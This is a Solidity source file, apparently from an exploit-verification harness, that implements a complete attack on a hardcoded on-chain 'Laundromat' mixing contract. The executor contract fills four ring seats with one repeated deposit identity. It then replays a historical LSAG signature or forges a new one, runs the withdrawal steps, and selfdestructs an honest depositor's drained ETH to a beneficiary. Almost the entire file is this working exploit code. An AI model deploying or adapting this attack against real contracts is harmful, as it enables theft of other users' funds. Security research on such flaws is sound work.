// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

address constant LAUNDROMAT = 0x934cbbE5377358e6712b5f041D90313d935C501C;
address constant SECP256K1_HELPER = 0x600Ad7B57F3e6aeeE53aCB8704a5ED50b60cAcD6;

uint256 constant SECP_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
uint256 constant GX = 0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798;
uint256 constant GY = 0x483ada7726a3c4655da4fbfc0e1108a8fd17b448a68554199c47d08ffb10d4b8;

uint256 constant HONEST_X = 0x03f29711206706d66564e2936d70a08f7002931eaa686a579cb9bd36b8801506;
uint256 constant HONEST_Y = 0x582d363ee7899d3fa7131de9d470656e4c9b9b1514929c3fc985b9da2105af1f;

uint256 constant HISTORICAL_DEPOSIT_X = 0x53fc1ed6fc846bb1bb169b59c0f09b68c5489f92a52de825288380980c45ca8a;
uint256 constant HISTORICAL_DEPOSIT_Y = 0xdd3a0e9477d9e2f82be3b891061fb1d435839c670ff6aa61183f5ee01d52d3b6;
uint256 constant HISTORICAL_X0 = 0xa844d117805bbe3b276c37582fc1f960b5870ccd0d1016ec39a2b32a5bc780cf;
uint256 constant HISTORICAL_IX = 0x3184ac964636725c9c94d3767739fd89fc58da189ef8579409052b860e00b28f;
uint256 constant HISTORICAL_IY = 0xd7b3de3e1198ad3c53db7b873132bd16741f130d8fe73e801b281182cc3da487;

interface ILaundromat {
    function deposit(uint256 commitment, uint256 proof) external payable;
    function withdrawStart(uint256[] calldata signature, uint256 x0, uint256 ix, uint256 iy) external;
    function withdrawStep() external;
    function withdrawFinal() external returns (bool);
}

error LaundromatStageFailed(uint8 stage, bytes revertData);
error LaundromatNoProfit();
error SecpCallFailed(bytes4 selector, bytes revertData);

contract FlawVerifier {
    uint256 private _realizedProfit;
    bool private _executed;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!_executed, "already executed");
        _executed = true;

        uint256 startingBalance = address(this).balance;

        for (uint8 strategy = 0; strategy < 5; ++strategy) {
            _tryStrategy(strategy);
            if (address(this).balance > startingBalance) break;
        }

        uint256 endingBalance = address(this).balance;
        if (endingBalance <= startingBalance) revert LaundromatNoProfit();
        _realizedProfit = endingBalance - startingBalance;
    }

    function _tryStrategy(uint8 strategy) private {
        try new LaundromatAttackExecutor(payable(address(this)), strategy) {} catch {}
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _realizedProfit;
    }
}

contract LaundromatAttackExecutor {
    bytes4 private constant HASH_POINT_SELECTOR = 0x1bfa5d8a;
    bytes4 private constant MUL_SELECTOR = 0xd876fb21;
    bytes4 private constant ADD_SELECTOR = 0x5f8eb4c7;
    bytes4 private constant TO_AFFINE_SELECTOR = 0x58da3ca9;

    constructor(address payable beneficiary, uint8 strategy) payable {
        require(beneficiary != address(0), "bad beneficiary");

        if (strategy == 0) {
            _historicalReplayAttempt();
        } else {
            (uint256 attackSecret, uint256 honestIndex, uint256 signerIndex) = _strategyConfig(strategy);
            _generatedAttempt(attackSecret, honestIndex, signerIndex);
        }

        if (address(this).balance == 0) revert LaundromatNoProfit();
        selfdestruct(beneficiary);
    }

    receive() external payable {}

    function _strategyConfig(uint8 strategy)
        private
        pure
        returns (uint256 attackSecret, uint256 honestIndex, uint256 signerIndex)
    {
        if (strategy == 1) return (1, 0, 1);
        if (strategy == 2) return (2, 0, 1);
        if (strategy == 3) return (1, 4, 0);
        return (2, 4, 0);
    }

    function _historicalReplayAttempt() private {
        _deposit4(HISTORICAL_DEPOSIT_X, HISTORICAL_DEPOSIT_Y);

        uint256[] memory sig = new uint256[](5);
        sig[0] = 0x33f79225929030e6369f0fbf5500142b8a4e10370e35f701a0e5c4d324f098d6;
        sig[1] = 0x93708ff3b6dcb272664acb22881510360a04ca1a0a05a8dda37d06ddc62e5bf0;
        sig[2] = 0xec91250cc040f420bdd11eb4b77cbf1d659ed043e88dbe49b392d44a85453e04;
        sig[3] = 0xddaef0451b6c22a35bc641cd5f66aae904351f8adca3e588f0385d9d0bec542f;
        sig[4] = 0x2652c96f86b22f421949daee41ffef503df3a06072e372de15105d0783bc2ba3;

        _checkedCall(
            2,
            abi.encodeWithSelector(
                ILaundromat.withdrawStart.selector,
                sig,
                HISTORICAL_X0,
                HISTORICAL_IX,
                HISTORICAL_IY
            )
        );
        _runWithdrawStepsAndFinalize();
    }

    function _generatedAttempt(uint256 attackSecret, uint256 honestIndex, uint256 signerIndex) private {
        require(attackSecret != 0 && attackSecret < SECP_N, "bad secret");
        require(honestIndex < 5, "bad honest index");
        require(signerIndex < 5 && signerIndex != honestIndex, "bad signer index");

        bytes memory attackPub = attackSecret == 1 ? _generator() : _toAffine(_mulAffine(_generator(), attackSecret));
        bytes memory honestPub = _affinePoint(HONEST_X, HONEST_Y);
        bytes memory attackHp = _hashPoint(attackPub);
        bytes memory honestHp = _hashPoint(honestPub);
        bytes memory keyImage = attackSecret == 1 ? attackHp : _toAffine(_mulAffine(attackHp, attackSecret));

        // Core exploit path remains the same as the finding and the historical exploit:
        // 1) fill the four empty seats for free with the same deposit identity,
        // 2) start the withdrawal flow for that now-complete round,
        // 3) advance all five withdraw steps,
        // 4) finalize and pull the dormant honest depositor's ETH.
        //
        // The only implementation variation here is signer generation. The original attack
        // replayed one concrete transcript from one concrete caller address. In a generic
        // verifier we instead regenerate a fresh LSAG transcript for this executor while
        // preserving the same round-completion and withdrawal causality.
        _deposit4(_word(attackPub, 0), _word(attackPub, 32));

        (bytes[5] memory pubs, bytes[5] memory hps) =
            _ringMembers(attackPub, honestPub, attackHp, honestHp, honestIndex);
        (uint256[] memory sig, uint256 x0) =
            _buildSignature(pubs, hps, keyImage, attackSecret, honestIndex, signerIndex);

        _checkedCall(
            2,
            abi.encodeWithSelector(
                ILaundromat.withdrawStart.selector,
                sig,
                x0,
                _word(keyImage, 0),
                _word(keyImage, 32)
            )
        );
        _runWithdrawStepsAndFinalize();
    }

    function _ringMembers(
        bytes memory attackPub,
        bytes memory honestPub,
        bytes memory attackHp,
        bytes memory honestHp,
        uint256 honestIndex
    ) private pure returns (bytes[5] memory pubs, bytes[5] memory hps) {
        for (uint256 i = 0; i < 5; ++i) {
            if (i == honestIndex) {
                pubs[i] = honestPub;
                hps[i] = honestHp;
            } else {
                pubs[i] = attackPub;
                hps[i] = attackHp;
            }
        }
    }

    function _buildSignature(
        bytes[5] memory pubs,
        bytes[5] memory hps,
        bytes memory keyImage,
        uint256 attackSecret,
        uint256 honestIndex,
        uint256 signerIndex
    ) private returns (uint256[] memory sig, uint256 x0) {
        uint256[5] memory responses;
        uint256[5] memory challenges;
        uint256 alpha = _nonZeroMod(
            uint256(keccak256(abi.encodePacked("laundromat-alpha", address(this), attackSecret, honestIndex, signerIndex)))
        );

        for (uint256 i = 0; i < 5; ++i) {
            if (i == signerIndex) continue;
            responses[i] = _nonZeroMod(
                uint256(keccak256(abi.encodePacked("laundromat-s", address(this), attackSecret, honestIndex, signerIndex, i)))
            );
        }

        challenges[(signerIndex + 1) % 5] = _challenge(
            _toAffine(_mulAffine(_generator(), alpha)),
            _toAffine(_mulAffine(hps[signerIndex], alpha))
        );

        for (uint256 hop = 1; hop < 5; ++hop) {
            uint256 idx = (signerIndex + hop) % 5;
            challenges[(idx + 1) % 5] = _nextChallenge(pubs[idx], hps[idx], keyImage, responses[idx], challenges[idx]);
        }

        responses[signerIndex] = addmod(alpha, SECP_N - mulmod(challenges[signerIndex], attackSecret, SECP_N), SECP_N);
        if (responses[signerIndex] == 0) responses[signerIndex] = 1;

        sig = new uint256[](5);
        for (uint256 i = 0; i < 5; ++i) {
            sig[i] = responses[i];
        }
        x0 = challenges[0];
    }

    function _nextChallenge(
        bytes memory pub,
        bytes memory hp,
        bytes memory keyImage,
        uint256 response,
        uint256 challengeValue
    ) private returns (uint256) {
        return _challenge(
            _toAffine(_add(_mulAffine(_generator(), response), _mulAffine(pub, challengeValue))),
            _toAffine(_add(_mulAffine(hp, response), _mulAffine(keyImage, challengeValue)))
        );
    }

    function _deposit4(uint256 repeatedX, uint256 repeatedY) private {
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
        _checkedCall(1, abi.encodeWithSelector(ILaundromat.deposit.selector, repeatedX, repeatedY));
    }

    function _runWithdrawStepsAndFinalize() private {
        uint256 startingBalance = address(this).balance;

        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));
        _checkedCall(3, abi.encodeWithSelector(ILaundromat.withdrawStep.selector));

        (bool ok, bytes memory ret) = LAUNDROMAT.call(abi.encodeWithSelector(ILaundromat.withdrawFinal.selector));
        if (!ok) revert LaundromatStageFailed(4, ret);

        bool finalized = ret.length == 0 || abi.decode(ret, (bool));
        if (!finalized && address(this).balance <= startingBalance) revert LaundromatNoProfit();
    }

    function _challenge(bytes memory left, bytes memory right) private view returns (uint256) {
        return _nonZeroMod(uint256(keccak256(abi.encodePacked(address(this), left, right))));
    }

    function _generator() private pure returns (bytes memory) {
        return _affinePoint(GX, GY);
    }

    function _affinePoint(uint256 x, uint256 y) private pure returns (bytes memory) {
        return abi.encodePacked(bytes32(x), bytes32(y));
    }

    function _hashPoint(bytes memory affine) private returns (bytes memory) {
        return _secpCall(HASH_POINT_SELECTOR, affine);
    }

    function _mulAffine(bytes memory affine, uint256 scalar) private returns (bytes memory) {
        return _secpCall(MUL_SELECTOR, abi.encodePacked(affine, bytes32(uint256(1)), bytes32(scalar)));
    }

    function _add(bytes memory a, bytes memory b) private returns (bytes memory) {
        return _secpCall(ADD_SELECTOR, abi.encodePacked(a, b));
    }

    function _toAffine(bytes memory point) private returns (bytes memory) {
        return _secpCall(TO_AFFINE_SELECTOR, point);
    }

    function _secpCall(bytes4 selector, bytes memory args) private returns (bytes memory out) {
        (bool ok, bytes memory ret) = SECP256K1_HELPER.call(abi.encodePacked(selector, args));
        if (!ok) revert SecpCallFailed(selector, ret);
        return ret;
    }

    function _checkedCall(uint8 stage, bytes memory data) private returns (bytes memory result) {
        (bool ok, bytes memory revertData) = LAUNDROMAT.call(data);
        if (!ok) revert LaundromatStageFailed(stage, revertData);
        return revertData;
    }

    function _word(bytes memory data, uint256 offset) private pure returns (uint256 value) {
        assembly {
            value := mload(add(add(data, 0x20), offset))
        }
    }

    function _nonZeroMod(uint256 value) private pure returns (uint256) {
        uint256 reduced = value % SECP_N;
        return reduced == 0 ? 1 : reduced;
    }
}
